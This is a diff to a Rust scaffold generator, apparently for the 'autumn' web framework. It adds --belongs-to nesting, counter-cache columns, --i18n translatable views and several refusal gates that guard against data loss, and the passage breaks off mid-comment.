@@ -12,13 +12,16 @@ use std::collections::{BTreeMap, BTreeSet};
 use std::fmt::Write as _;
 use std::path::Path;
 
-use super::dsl::{Field, FieldKind, IdType, parse_fields};
+use super::dsl::{
+    EncryptedMode, Field, FieldKind, IdType, parse_fields, randomized_equality_lookup_reason,
+};
 use super::emit::{Action, Plan, Revert};
 use super::model::{
     ModelOptions, augment_fields_for_soft_delete, field_by_name, parse_model_metadata,
     plan_cargo_deps, plan_model_with_options,
 };
 use super::naming::{humanize_label, pascal, pluralize, snake};
+use super::scaffold_i18n;
 use super::schema_edit::{
     add_mod_declaration, create_table_sql_with_metadata_and_id, ensure_autumn_web_feature,
     ensure_dependency_feature, ensure_dev_dependency_test_support,
@@ -57,6 +60,35 @@ pub struct ScaffoldOptions {
     /// (non-live, non-sharded) path — authorizes the mutating HTML handlers and
     /// scopes the index. `--api` scaffolds never generate a policy.
     pub no_policy: bool,
+    /// Bind this resource to a parent as its child (issue #1323) —
+    /// `--belongs-to Post`. Names the parent in `PascalCase` or `snake_case`;
+    /// the foreign key is this scaffold's own `references` column targeting the
+    /// parent's table (`post:references` -> `post_id`).
+    ///
+    /// `Some(parent)` adds a nested read route (`GET
+    /// /<parents>/{<fk>}/<children>`), a nested create route whose FK comes from
+    /// the path rather than the submitted body, a children list + inline create
+    /// form injected into the parent's generated `show` view, and back-links in
+    /// both directions. `None` (the default) keeps the flat, single-table
+    /// scaffold's output byte-for-byte unchanged.
+    pub belongs_to: Option<String>,
+    /// Maintain a `{child}_count` column on the parent (issue #1325) —
+    /// `--counter-cache`, which requires `--belongs-to`. Adds `counter_cache` to
+    /// the generated child model's `#[belongs_to(...)]` and a migration adding
+    /// `{child}_count BIGINT NOT NULL DEFAULT 0` to the parent's table.
+    pub counter_cache: bool,
+    /// Emit translatable views (issue #1349) — `--i18n`. Every user-facing
+    /// string in the generated HTML views (page titles, headings, buttons,
+    /// links, per-field labels) becomes a `t!(locale, "key")` lookup, each
+    /// view-rendering handler takes the `Locale` extractor, and the keys are
+    /// back-filled into `i18n/en.ftl` with their English values — so a
+    /// default-locale app renders exactly as it does without the flag, and
+    /// adding a locale is a `.ftl` file rather than a Rust edit.
+    ///
+    /// `false` (the default) keeps the scaffold's output byte-for-byte
+    /// unchanged: [`super::scaffold_i18n::ViewLabels`] is an identity function
+    /// over the literal expressions the plain path emits.
+    pub i18n: bool,
 }
 
 #[derive(Debug, Clone, PartialEq, Eq)]
@@ -168,7 +200,7 @@ fn layout_param_counts(main_src: &str) -> Vec<usize> {
 }
 
 /// Whether a raw string literal begins at `start` (`r"`, `r#"`, `br"`, …).
-fn is_raw_string_start(bytes: &[u8], start: usize) -> bool {
+pub(super) fn is_raw_string_start(bytes: &[u8], start: usize) -> bool {
     let mut i = start;
     if bytes.get(i) == Some(&b'b') {
         i += 1;
@@ -186,7 +218,7 @@ fn is_raw_string_start(bytes: &[u8], start: usize) -> bool {
 /// Advance past a raw string literal beginning at `start`, matching the opening
 /// hash count. Returns the index just past the closing delimiter (or the end of
 /// input if the literal is unterminated).
-fn skip_raw_string(bytes: &[u8], start: usize) -> usize {
+pub(super) fn skip_raw_string(bytes: &[u8], start: usize) -> usize {
     let mut i = start;
     if bytes.get(i) == Some(&b'b') {
         i += 1;
@@ -217,7 +249,7 @@ fn skip_raw_string(bytes: &[u8], start: usize) -> usize {
 
 /// Whether the byte before `i` is an identifier-continuation char, used to
 /// avoid mistaking a trailing `r`/`b` inside an identifier for a raw string.
-fn prev_is_ident_char(bytes: &[u8], i: usize) -> bool {
+const fn prev_is_ident_char(bytes: &[u8], i: usize) -> bool {
     i > 0 && (bytes[i - 1].is_ascii_alphanumeric() || bytes[i - 1] == b'_')
 }
 
@@ -402,9 +434,223 @@ fn plan_scaffold_with_options_impl(
     }
     let mut fields = parse_fields(field_tokens)?;
     super::model::apply_unique_flags(&mut fields, &options.model.uniques)?;
+    // Gate (issue #1384): a `{translatable}` column holds a per-locale
+    // container, and the scaffold's CRUD form is a single plain text input
+    // bound to the whole column. Submitting it would REPLACE the container
+    // with one locale's value — silently destroying every other translation on
+    // the first edit — and the index/CSV/filter/sort paths would operate on
+    // the raw JSON. Editing translated content needs a per-locale form, which
+    // is translation-workflow UI and deliberately out of scope here. Refuse up
+    // front rather than emit a CRUD screen that eats data.
+    // `!for_revert`, like every other generation-only gate here: `autumn destroy
+    // scaffold` recomputes this plan before reverting it, and a refusal on that
+    // path would strand the very files the user asked to remove.
+    if let Some(f) = fields
+        .iter()
+        .filter(|_| !for_revert)
+        .find(|f| f.is_translatable())
+    {
+        return Err(GenerateError::Config(format!(
+            "a `{{translatable}}` field (`{}`) is not supported by `generate scaffold`: the \
+             generated CRUD form binds one plain text input to the whole per-locale container, \
+             so saving the form would replace every other locale's value. Use `generate model \
+             {name} {}:...{{translatable}} ...` (which emits the model, schema and migration) \
+             and write the per-locale edit view yourself — `post.title_localized()`, \
+             `post.available_locales(\"title\")` and `post.set_title(locale, value)` are \
+             generated for you.",
+            f.name, f.name
+        )));
+    }
     if !options.api {
         validate_enum_field_names_against_routes_imports(&fields, &pascal(name))?;
     }
+    // Gate (issue #1260): a `slug` field reroutes the standard (non-`--api`)
+    // HTML `show`/`edit`/`update`/`delete` routes and their generated links to
+    // key off the slug instead of `id` (see `render_routes_file`'s
+    // `route_key`). That rekeying is only wired for the plain, non-`--live`,
+    // non-`--sharded`, non-attachment, non-state-machine path so far — refuse
+    // the unsupported combinations up front rather than emit routes that
+    // silently keep keying off `id` (or, worse, half-rekey and fail to
+    // compile).
+    if fields.iter().any(|f| f.kind.is_slug()) {
+        if options.live || options.live_validation {
+            return Err(GenerateError::Config(
+                "a `slug` field is not yet supported together with `--live`/`--live-validation`: \
+                 the SSE live-list scaffold still keys its routes off `id`."
+                    .to_owned(),
+            ));
+        }
+        if options.model.sharded {
+            return Err(GenerateError::Config(
+                "a `slug` field is not yet supported together with `--sharded`: the sharded \
+                 scaffold still keys its routes off `id`."
+                    .to_owned(),
+            ));
+        }
+        if has_attachment_fields(&fields) {
+            return Err(GenerateError::Config(
+                "a `slug` field is not yet supported alongside an `Attachment` field: the \
+                 multipart create/update handlers still key their routes off `id`."
+                    .to_owned(),
+            ));
+        }
+        if fields.iter().any(|f| f.state_machine.is_some()) {
+            return Err(GenerateError::Config(
+                "a `slug` field is not yet supported alongside a `:states(...)` field: the \
+                 transition handler still keys its route off `id`."
+                    .to_owned(),
+            ));
+        }
+    }
+    // Gate (issue #1349): `--i18n` rewrites the standard HTML views' strings
+    // into `t!(locale, "key")` lookups, which need a `Locale` extractor in scope
+    // at the render site. Two families of view code have no such scope:
+    //
+    //   * `--live`/`--live-validation` render list rows from a `LiveFragment`
+    //     impl driven by an SSE broadcast — there is no request, so no locale;
+    //   * `--belongs-to` renders the child list and inline create form through
+    //     the nested renderer, which splices markup into the PARENT resource's
+    //     already-generated `show` handler (whose signature this generator does
+    //     not own).
+    //
+    // Emitting half-translated views under a flag that promises translatable
+    // output is worse than refusing: the untranslated half only surfaces once
+    // someone adds a second locale. Same posture as the `slug` gates above.
+    //
+    // `for_revert` skips the gate so `autumn destroy scaffold` can still clean
+    // up a resource generated before a refusal existed (issue #1834).
+    // `--api` renders no labels, so `--i18n` is documented as a pure no-op
+    // there — which has to include these refusals. Otherwise
+    // `generate scaffold Common --api --i18n` fails while the identical
+    // `--api` scaffold succeeds, and a flag that changes nothing about the
+    // output would still change whether it is allowed to exist.
+    if !for_revert && options.i18n && !options.api {
+        let unsupported = if options.live {
+            Some((
+                "--live",
+                "the SSE live list renders its rows from a `LiveFragment` impl outside any \
+                 request, so no `Locale` extractor is in scope",
+            ))
+        } else if options.live_validation {
+            Some((
+                "--live-validation",
+                "the inline-validation fragments re-render single form controls outside the \
+                 handlers that carry the `Locale` extractor",
+            ))
+        } else if options.belongs_to.is_some() {
+            Some((
+                "--belongs-to",
+                "the nested child list and inline create form are spliced into the parent \
+                 resource's already-generated `show` handler, whose signature this scaffold \
+                 does not own",
+            ))
+        } else {
+            None
+        };
+        if let Some((variant, why)) = unsupported {
+            return Err(GenerateError::Config(format!(
+                "`--i18n` is not yet supported together with `{variant}`: {why}. Drop \
+                 `{variant}` to get translatable views, or drop `--i18n` to keep the \
+                 English-only scaffold."
+            )));
+        }
+        // A resource named `Common` would key its labels under `common.*` — the
+        // same namespace the shared chrome block owns. Its keys would be written
+        // into both blocks, and `destroy`ing it would strip the chrome every
+        // OTHER resource is still referencing, so those resources stop
+        // compiling (`t!` validates key existence at compile time). Refuse the
+        // name rather than emit a bundle that breaks its neighbours.
+        if snake(name) == "common" {
+            return Err(GenerateError::Config(
+                "`--i18n` cannot scaffold a resource named `Common`: its translation keys would \
+                 land under `common.*`, the namespace reserved for the shared chrome every \
+                 scaffolded resource reuses — destroying it later would take that chrome down \
+                 with it and break every other `--i18n` resource. Rename the resource (e.g. \
+                 `CommonSetting`), or drop `--i18n`."
+                    .to_owned(),
+            ));
+        }
+    }
+    // Gate (issue #1318): a `lock_version` column rewrites the HTML `update`
+    // handler's write into a `WHERE lock_version = $expected` guarded statement
+    // and adds a 409 re-render branch. That rewrite is wired for the standard
+    // raw-diesel write only. `--live`/`--sharded` write through the repository
+    // extractor and the attachment path writes after a multipart blob save;
+    // generating those would emit an edit form that *looks* concurrency-safe
+    // while the write still clobbers. Refuse the combination up front rather
+    // than ship silently lossy code (same posture as the `slug` gates above).
+    //
+    // `--api` is exempt outright — including `--api --live`, `--api --sharded`
+    // and the rest. Those variants only ever change the HTML surface, and an
+    // `--api` scaffold emits no routes file at all, so there is no form and no
+    // raw-diesel update to be inconsistent with. The model's `#[lock_version]`
+    // still lands, which is what makes the repository's own JSON update
+    // conflict-check. Refusing them would break combinations that generated
+    // fine before this feature existed.
+    // `for_revert` skips the whole gate: `autumn destroy scaffold` recomputes the
+    // plan it is about to revert, and a scaffold created before these refusals
+    // existed (`lock_version:i32 --live`, say) must still be removable. The
+    // refusal would fire during the recompute — before `Plan::revert` ever sees
+    // `--force` — and strand exactly the files the user asked to delete. Same
+    // posture as the shared-layout preflight below (issue #1834).
+    if !for_revert && !options.api && super::model::lock_version_field(&fields).is_some() {
+        // `--live-validation` is supported: it changes only how the form's
+        // controls are rendered (raw htmx inputs instead of `form_for`), while
+        // its `update` still writes through the same raw-diesel statement.
+        let unsupported = if options.live {
+            Some((
+                "--live",
+                "the SSE live scaffold writes through the repository extractor, not the \
+                 guarded `diesel::update(...).filter(lock_version.eq(...))` statement",
+                "Drop `--live`",
+            ))
+        } else if options.model.sharded {
+            Some((
+                "--sharded",
+                "the sharded scaffold writes through `Pg{Model}Repository::from_shard`, not \
+                 the guarded `diesel::update(...).filter(lock_version.eq(...))` statement",
+                "Drop `--sharded`",
+            ))
+        } else if has_attachment_fields(&fields) {
+            Some((
+                "an `attachment` field",
+                "the multipart update handler saves the blob before the row write, so a \
+                 rejected stale submit would leave an orphaned upload behind",
+                "Drop the attachment column",
+            ))
+        } else if fields.iter().any(|f| f.kind.is_slug()) {
+            // A slug scaffold keys its `update` off the slug, not the primary
+            // key (issue #1260), so the guarded statement would read
+            // `WHERE slug = $1 AND lock_version = $2`. That pair is not a stable
+            // row identity: the slug is editable and re-derivable, and every new
+            // row starts at version 0. Rename a row's slug, let a *different*
+            // row take the freed slug, and a stale submit against the old slug
+            // matches the new row at its default version — committing one
+            // author's edit over an unrelated record and reporting success.
+            // Keying the guard off the primary key instead is the real fix and
+            // needs the update handler to resolve the row first on every slug
+            // variant (including `--no-policy`, which loads nothing today);
+            // refuse the pair until that lands rather than ship the swap.
+            Some((
+                "a `slug` column",
+                "a slug scaffold keys its update off the (editable, reusable) slug rather \
+                 than the primary key, so `WHERE slug = ... AND lock_version = ...` does not \
+                 identify a stable row — a renamed slug reclaimed by a new row would let a \
+                 stale submit commit over that unrelated record",
+                "Drop the slug column (the scaffold keys off `id`)",
+            ))
+        } else {
+            None
+        };
+        if let Some((variant, why, remedy)) = unsupported {
+            return Err(GenerateError::Config(format!(
+                "a `lock_version` column is not yet supported together with {variant}: {why}. \
+                 {remedy} to get the conflict-aware edit form, or rename the `lock_version` \
+                 column if optimistic locking was not intended."
+            )));
+        }
+    }
+
     // Resolve shard key before planning the model (propagates to model render).
     let resolved_shard_key = resolve_shard_key(&fields, &options.model)?;
     let model_options_with_key = ModelOptions {
@@ -418,24 +664,240 @@ fn plan_scaffold_with_options_impl(
         live: options.live,
         live_validation: options.live_validation,
         no_policy: options.no_policy,
+        belongs_to: options.belongs_to.clone(),
+        counter_cache: options.counter_cache,
+        i18n: options.i18n,
     };
-    let mut plan = plan_model_with_options(
-        project_root,
-        name,
-        field_tokens,
-        timestamp,
-        &options_with_key.model,
-    )?;
-    let metadata = parse_model_metadata(&fields, &options_with_key.model)?;
-    let queries = parse_query_specs(&fields, &options_with_key.queries)?;
+    let mut plan = if for_revert {
+        super::model::plan_model_with_options_for_revert(
+            project_root,
+            name,
+            field_tokens,
+            timestamp,
+            &options_with_key.model,
+        )?
+    } else {
+        plan_model_with_options(
+            project_root,
+            name,
+            field_tokens,
+            timestamp,
+            &options_with_key.model,
+        )?
+    };
+    let mut metadata = parse_model_metadata(&fields, &options_with_key.model)?;
+    // Issue #1367: see `model::plan_model` — `by` is emitted only when the
+    // author model it names is really there.
+    metadata.set_commentable_author(super::commentable::detect_author_model(project_root));
+    // A `--default field=value` column is dropped from `form_fields` (see
+    // below) and therefore from the generated `New{Pascal}` insert struct
+    // entirely (it's set at the SQL `DEFAULT` level instead) — a slug can't
+    // derive `from:` it, since the create handler's `new.{from}` wouldn't
+    // exist to read. dsl.rs's `validate_slug_fields` can't catch this itself:
+    // `--default` metadata isn't visible until here.
+    if let Some(slug) = fields.iter().find(|f| f.kind.is_slug())
+        && let Some(from) = slug.constraints.from.as_deref()
+        && metadata.defaults().contains_key(from)
+    {
+        return Err(GenerateError::Config(format!(
+            "slug field '{}' derives `from:{from}`, but '{from}' has a `--default` value and \
+             is dropped from the generated New{{Pascal}} insert struct — slug can't read it \
+             at create time",
+            slug.name
+        )));
+    }
+    let queries = parse_query_specs(&fields, &options_with_key.queries, for_revert)?;
     let form_fields = fields
         .iter()
         .filter(|field| !metadata.defaults().contains_key(&field.name))
         .cloned()
         .collect::<Vec<_>>();
+    // The equivalent guard for the insert struct (issue #1318) lives in
+    // `plan_model_with_options`, which the scaffold delegates to above — so a
+    // lock-only scaffold is refused before it reaches here, and `generate model`
+    // gets the same refusal without the scaffold planner having to be involved.
     let pascal_name = pascal(name);
     let snake_name = snake(name);
     let plural = pluralize(&snake_name);
+
+    // ── Parent/child nesting (issue #1323) ─────────────────────────────────
+    // `--belongs-to Post` binds this resource to a parent: nested routes here,
+    // a children list + inline create form injected into the parent's own
+    // `show` view below. `None` for every flat scaffold, which keeps all of the
+    // emission below byte-for-byte what it was before this feature existed.
+    let nesting = super::nested::resolve(
+        project_root,
+        &plural,
+        &fields,
+        &options_with_key,
+        for_revert,
+    )?;
+
+    // Issue #1349: the `--belongs-to` refusal above reads the command line, and
+    // the command line is not where a nesting necessarily comes from. `resolve`
+    // deliberately recovers the relationship from the markers in the parent's
+    // routes file when the flag is not repeated — which is the ordinary "I
+    // changed a field, re-scaffold it" run. Without this second gate,
+    // `generate … --force --i18n` on an existing child is accepted and emits
+    // nested views whose heading, empty state, add button, and parent backlink
+    // are still hardcoded English: a half-translated module, which is precisely
+    // what the refusal exists to prevent.
+    //
+    // Two gates rather than one moved gate: the early one needs no disk reads
+    // and fires on the typed flag even in a project where `resolve` would fail
+    // first for an unrelated reason (an unscaffolded parent, say), so the user
+    // hears about the combination they asked for rather than about a
+    // precondition they would then have to satisfy only to be refused anyway.
+    // This one is reachable only for a recovered nesting, and says so.
+    if !for_revert
+        && options_with_key.i18n
+        && !options_with_key.api
+        && let Some(n) = nesting.as_ref()
+    {
+        return Err(GenerateError::Config(format!(
+            "`--i18n` is not yet supported for a nested resource, and {plural} is still nested \
+             under {parent}: src/routes/{parent}.rs renders their children section, which is \
+             where this run recovered the relationship from (`--belongs-to` is typed once, so \
+             a later `--force` rarely repeats it). The nested child list and inline create form \
+             are spliced into {parent}.rs's already-generated `show` handler, whose signature \
+             this scaffold does not own — so those views would stay hardcoded English while the \
+             rest of the module was translated. Drop `--i18n` to regenerate the nested scaffold \
+             as it is, or `autumn destroy scaffold {name} …` first (that removes the \
+             parent-side section from src/routes/{parent}.rs) and scaffold it flat with \
+             `--i18n`. Nothing has been written.",
+            parent = n.parent_plural,
+        )));
+    }
+
+    // ── Counter cache (issue #1325) ────────────────────────────────────────
+    // `--counter-cache` maintains `{parent}.{child}_count`. The maintenance is
+    // declared on the CHILD's `belongs_to`, so the flag only makes sense
+    // alongside `--belongs-to` — which is also what supplies the parent's name
+    // and table.
+    if options_with_key.counter_cache {
+        let Some(n) = nesting.as_ref() else {
+            return Err(GenerateError::Config(
+                "`--counter-cache` requires `--belongs-to <Parent>`: the counter is \
+                 maintained by this resource's `belongs_to` leg, and the parent \
+                 named there is the table the `{child}_count` column goes on"
+                    .to_owned(),
+            ));
+        };
+        // The migration actions go on the revert plan too — that is how
+        // `Plan::revert` finds the directory to remove. Only the follow-up
+        // warning is generate-only.
+        super::counter_cache::push_counter_cache_migration(
+            &mut plan,
+            project_root,
+            timestamp,
+            &snake_name,
+            &n.parent_plural,
+        );
+        if !for_revert {
+            super::counter_cache::push_counter_cache_warning(
+                &mut plan,
+                &snake_name,
+                &n.parent_pascal,
+                &n.parent_plural,
+            );
+        }
+        // Opt the generated child model in. The model file is an action this
+        // plan is about to create, so the attribute is added by rewriting that
+        // pending content rather than by touching the disk twice.
+        let model_path = project_root
+            .join("src")
+            .join("models")
+            .join(format!("{snake_name}.rs"));
+        for action in &mut plan.actions {
+            if let crate::generate::emit::Action::Create { path, contents } = action
+                && path == &model_path
+            {
+                *contents = super::counter_cache::add_counter_cache_to_model_source(
+                    contents,
+                    &pascal_name,
+                    &n.parent_pascal,
+                );
+            }
+        }
+    }
+
+    // ── Polymorphic comments (issue #1367) ─────────────────────────────────
+    // A `comments:commentable` token is already a column on this model (the
+    // counter-cache source) and an attribute on the generated `#[model]`; what
+    // is left is the shared `comments` table. It is emitted at most once per
+    // project — that is what makes adding comments to a SECOND model the DSL
+    // token and nothing else.
+    // On the destroy path the field tokens are not repeated, so the
+    // declaration is recovered from the model file instead.
+    if fields.iter().any(|f| f.kind.is_commentable())
+        || (for_revert && super::commentable::model_declares_commentable(project_root, &snake_name))
+    {
+        // On a revert, the shared table stays as long as ANY other model still
+        // declares `#[commentable]` — it is one table for all of them, so
+        // taking it out with this model would break every other one.
+        let backend = super::detect_backend(project_root);
+        let revert_would_orphan_another_model = for_revert
+            && super::commentable::another_model_is_still_commentable(project_root, &snake_name);
+        let emitted = !revert_would_orphan_another_model
+            && super::commentable::push_commentable_migration(
+                &mut plan,
+                project_root,
+                timestamp,
+                backend,
+                for_revert,
+            );
+        if !for_revert {
+            if emitted {
+                if super::commentable::conflicting_comments_table(project_root) {
+                    plan.warn(format!(
+                        "This project already has a `{table}` table that is NOT the \
+                         polymorphic one — a `Comment` model scaffolded the ordinary \
+                         way creates exactly that, and the shared table takes the same \
+                         name. Both `CREATE TABLE {table}` statements will be applied \
+                         and `migrate` will stop on \"already exists\". Rename or drop \
+                         the existing table, or add `commentable_type TEXT NOT NULL` \
+                         and `commentable_id BIGINT NOT NULL` to it and delete the \
+                         migration just written.",
+                        table = super::commentable::COMMENTS_TABLE,
+                    ));
+                }
+                plan.warn(format!(
+                    "Added the shared `{table}` table. Every `#[commentable]` model \
+                     attaches to it, so later models need no migration of their own. \
+                     Mount the framework's comment routes once, e.g. \
+                     `.nest(\"/comments\", autumn_web::commentable::router(Default::default()))`, \
+                     and render a thread with \
+                     `autumn_web::widgets::comment_thread`.",
+                    table = super::commentable::COMMENTS_TABLE,
+                ));
+            } else {
+                plan.warn(format!(
+                    "Reusing the existing `{table}` table — the polymorphic comments table \
+                     is shared across every `#[commentable]` model, so no migration was \
+                     added for {pascal_name}.",
+                    table = super::commentable::COMMENTS_TABLE,
+                ));
+            }
+            plan.warn(
+                super::commentable::detect_author_model(project_root).map_or_else(
+                    || {
+                        "This project has no `User` model, so the generated \
+                         `#[commentable]` names no author model. Add `by = <AuthorModel>` \
+                         (and `author_name = <column>`) once you have one — until then \
+                         threads render authors as `user #id`."
+                            .to_owned()
+                    },
+                    |author| {
+                        format!(
+                            "`#[commentable(by = {author}, ...)]` on the generated model \
+                             names this app's author model. Add `author_name = <column>` \
+                             to render display names instead of `user #id`."
+                        )
+                    },
+                ),
+            );
+        }
+    }
 
     // ── Record-level authorization (issue #1125) ───────────────────────────
     // A policy is generated by default for every non-`--api` scaffold unless
@@ -630,6 +1092,15 @@ fn plan_scaffold_with_options_impl(
             authorize_wiring
                 .then(|| owner_column.as_ref().map(|o| o.name.as_str()))
                 .flatten(),
+            // Issue #1358: `position(...)` is rejected outright by
+            // `#[repository(..., sharded)]` at macro-expansion time (a move
+            // only reaches the pool/shard it happens to be given — see
+            // autumn-macros' `parse_repo_args`), so a `--sharded` scaffold
+            // must never emit it, or the generated project fails to compile
+            // with a macro error instead of a clear generate-time one.
+            (!options_with_key.model.sharded)
+                .then(|| fields.iter().find(|f| f.kind.is_position()))
+                .flatten(),
         ),
     );
     let repo_mod_path = repos_dir.join("mod.rs");
@@ -642,6 +1113,62 @@ fn plan_scaffold_with_options_impl(
         name: snake_name.clone(),
     });
 
+    // …and the mirror: children nested INTO this resource. Destroying a parent
+    // out from under them deletes the module they still import
+    // (`crate::routes::<parent>::paths`, `schema::<parents>`) and leaves their
+    // nested routes mounted — an uncompilable project. The default destroy
+    // already stops, but only by accident: the injected section reads as
+    // "diverged from generated content", whose message says nothing about
+    // children and which `--force` waves straight through. Refuse explicitly
+    // instead, naming them, so `--force` cannot turn a deliberate override of
+    // one check into silent breakage of another.
+    if for_revert && !options_with_key.api {
+        let dependents = super::nested::children_nested_under(project_root, &plural);
+        if !dependents.is_empty() {
+            return Err(GenerateError::Config(format!(
+                "{} nested under {plural}, and src/routes/{plural}.rs renders their children \
+                 section. Destroying {plural} now would delete the module they import \
+                 (`crate::routes::{plural}::paths`, `schema::{plural}`) and leave their \
+                 nested routes mounted. Destroy {} first — that also removes the section from \
+                 src/routes/{plural}.rs — then destroy {plural}.",
+                if dependents.len() == 1 {
+                    format!("{} is", dependents[0])
+                } else {
+                    format!("{} are", dependents.join(", "))
+                },
+                dependents.join(", "),
+            )));
+        }
+    }
+
+    // Parents this resource is currently nested under, discovered from the
+    // `// autumn:nested:<plural>` markers already on disk (issue #1323). On the
+    // GENERATE path this is always empty — the marker is written by the `Modify`
+    // this same run is about to plan — so it costs one directory scan and
+    // changes nothing. On the DESTROY path it is the ONLY evidence available
+    // when `--belongs-to` was not repeated on the command line, and it drives
+    // both the parent-side cleanup and the `main.rs` unmounting below.
+    let nested_parents = if options_with_key.api {
+        Vec::new()
+    } else {
+        super::nested::parents_carrying_child(project_root, &plural)
+    };
+
+    // Nesting recovered from the markers rather than declared: say so, since the
+    // emitted module then carries nested routes the command line never asked for.
+    if let Some(n) = nesting.as_ref()
+        && n.inferred
+        && !for_revert
+    {
+        plan.warn(format!(
+            "src/routes/{parent}.rs still nests {plural} (a `--belongs-to {pascal}` \
+             scaffold), so the regenerated module keeps its nested routes. Pass \
+             `--belongs-to {pascal}` to make that explicit, or \
+             `autumn destroy scaffold {name} …` first to un-nest.",
+            parent = n.parent_plural,
+            pascal = n.parent_pascal,
+        ));
+    }
     // Route file under `src/routes/<plural>.rs`
     if !options_with_key.api {
         // The shared-layout preflight applies only to standard scaffolds, which
@@ -694,27 +1221,472 @@ fn plan_scaffold_with_options_impl(
             }
         }
         let routes_dir = project_root.join("src").join("routes");
-        plan.create(
-            routes_dir.join(format!("{plural}.rs")),
-            render_routes_file(
-                project_root,
+        let own_routes_path = routes_dir.join(format!("{plural}.rs"));
+        // This resource may itself be a PARENT: its `show` can carry sections
+        // injected for children nested under it (issue #1323). The flat template
+        // below knows nothing about those, so a `--force` regeneration would
+        // overwrite them away — silently dropping the children list AND the only
+        // durable record of the relationship, after which a child regeneration
+        // would emit no nested handlers while `main.rs` still mounted them.
+        // Re-apply them onto the fresh render instead. Empty for the common
+        // case, and skipped on the revert path (where this Create is a Delete).
+        let previous_own_routes = if for_revert {
+            String::new()
+        } else {
+            read_or_empty(&own_routes_path)
+        };
+        // Issue #1349: the one seam every user-facing string in the generated
+        // views passes through. With `--i18n` off it returns each caller's
+        // literal expression verbatim, so the rendered file is byte-for-byte
+        // what it was before this feature existed; with it on, each string
+        // becomes a `t!(locale, "key")` lookup and the key/English pair is
+        // recorded for the `i18n/en.ftl` back-fill below.
+        let labels = scaffold_i18n::ViewLabels::new(options_with_key.i18n);
+        let fresh_own_routes = render_routes_file(
+            project_root,
+            &pascal_name,
+            &snake_name,
+            &plural,
+            &form_fields,
+            &fields,
+            options_with_key.model.sharded,
+            options_with_key.model.soft_delete,
+            options_with_key.model.id_type,
+            options_with_key.live,
+            options_with_key.live_validation,
+            metadata.validations(),
+            &missing_reference_targets,
+            authorize_routes,
+            owner_column.as_ref().map(|o| o.name.as_str()),
+            &options_with_key.model.searchable,
+            nesting.as_ref(),
+            &labels,
+        );
+        let own_routes = super::nested::reapply_children(&previous_own_routes, &fresh_own_routes)
+            .map_err(|refused| {
+            GenerateError::Config(format!(
+                "{} nested under {plural}, but this run re-renders src/routes/{plural}.rs \
+                     into a shape their children section cannot be put back into (a \
+                     `--sharded` parent holds a `ShardedDb` the section cannot borrow; \
+                     `--live` and `--api` reshape the `show` view it renders in). Re-running \
+                     would silently drop the children list. Destroy {} first — that removes \
+                     the section — then regenerate {plural}. Nothing has been written.",
+                if refused.len() == 1 {
+                    format!("{} is", refused[0])
+                } else {
+                    format!("{} are", refused.join(", "))
+                },
+                refused.join(", "),
+            ))
+        })?;
+        plan.create(own_routes_path, own_routes);
+
+        // Issue #1349: back-fill `i18n/en.ftl` with every key the views just
+        // referenced, and wire the three project-level bits that make those
+        // lookups resolve with no further config (AC4).
+        //
+        // Order matters for the *file*, not the plan: `t!` validates key
+        // existence at COMPILE time against the default locale's bundle, so a
+        // referenced key missing from `en.ftl` is a `compile_error!` in the
+        // user's app rather than a runtime miss. `labels.used_keys()` is the
+        // exact set the render emitted — no more (which `autumn i18n check`
+        // would flag as unused) and no fewer.
+        let autumn_toml_path_for_i18n = project_root.join("autumn.toml");
+        let referenced_keys = labels.used_keys();
+        if labels.enabled() && !referenced_keys.is_empty() {
+            // Write to the bundle the app actually resolves through, not a
+            // hardcoded `i18n/en.ftl`. A project configured with
+            // `default_locale = "fr"` — or `dir = "translations"` — looks its
+            // keys up somewhere else entirely, so keys parked at the default
+            // path would render as visible `{$post.index.title}` placeholders
+            // and read as "missing from the default locale" to `autumn i18n
+            // check`, while `t!`'s compile-time validation (which looks under
+            // `i18n/` for `en`) passed and hid it until runtime.
+            let (configured_locale, configured_dir) =
+                scaffold_i18n::configured_i18n(&read_or_empty(&autumn_toml_path_for_i18n));
+            let default_locale = configured_locale.unwrap_or_else(|| "en".to_owned());
+            let i18n_dir = configured_dir.unwrap_or_else(|| "i18n".to_owned());
+            let ftl_path = project_root
+                .join(&i18n_dir)
+                .join(format!("{default_locale}.ftl"));
+            // NOT `read_or_empty`: that maps an unreadable or non-UTF-8 file to
+            // `""`, and the merge would then write a fresh English file straight
+            // over somebody's translations. An existing bundle we cannot read is
+            // a hard error, not an empty one.
+            let existing_ftl = match std::fs::read_to_string(&ftl_path) {
+                Ok(contents) => contents,
+                Err(e) if e.kind() == std::io::ErrorKind::NotFound => String::new(),
+                Err(e) => {
+                    return Err(GenerateError::Config(format!(
+                        "cannot read the existing i18n bundle at {}: {e}. Refusing to continue \
+                         — merging would replace it with a freshly generated file and lose \
+                         whatever translations it holds. Fix the file (it must be UTF-8 and \
+                         readable) and re-run.",
+                        ftl_path.display()
+                    )));
+                }
+            };
+            // A `--force` regeneration reconciles the block against the keys
+            // the NEW render emits, which is what stops a dropped field
+            // leaving orphans behind — but a key this render no longer emits
+            // can still be called from hand-written code elsewhere, and `t!`
+            // rejects a missing key at COMPILE time. Same project scan
+            // `destroy` uses, reading the plan's PENDING contents so this
+            // resource's own freshly rendered routes are what count for it,
+            // not the superseded file still on disk.
+            let pending = super::emit::pending_contents(&plan);
+            let surviving_scan = super::emit::scan_surviving_sources(project_root, &[], &pending);
+            let still_referenced =
+                super::emit::keys_still_referenced_in(&surviving_scan, &existing_ftl);
+            let merged = scaffold_i18n::merge_en_ftl_keeping(
+                &existing_ftl,
                 &pascal_name,
                 &snake_name,
-                &plural,
-                &form_fields,
-                &fields,
-                options_with_key.model.sharded,
-                options_with_key.model.soft_delete,
-                options_with_key.model.id_type,
-                options_with_key.live,
-                options_with_key.live_validation,
-                metadata.validations(),
-                &missing_reference_targets,
-                authorize_routes,
-                owner_column.as_ref().map(|o| o.name.as_str()),
-                &options_with_key.model.searchable,
-            ),
-        );
+                &referenced_keys,
+                &still_referenced,
+            );
+            if merged != existing_ftl {
+                // `create` rather than `modify` when the file is new: the plan's
+                // collision check should treat a first-time `i18n/en.ftl` like
+                // any other generated file.
+                if existing_ftl.is_empty() && !ftl_path.exists() {
+                    plan.create(ftl_path.clone(), merged);
+                } else {
+                    plan.modify(ftl_path.clone(), merged);
+                }
+            }
+            // `t!`'s COMPILE-TIME key check does not read `autumn.toml`. It
+            // resolves its own bundle from `AUTUMN_I18N_FILE`, else
+            // `$CARGO_MANIFEST_DIR/i18n/$AUTUMN_I18N_DEFAULT_LOCALE.ftl` with
+            // the locale defaulting to `en`, and degrades to a runtime lookup
+            // only when that file is ABSENT. So a project on
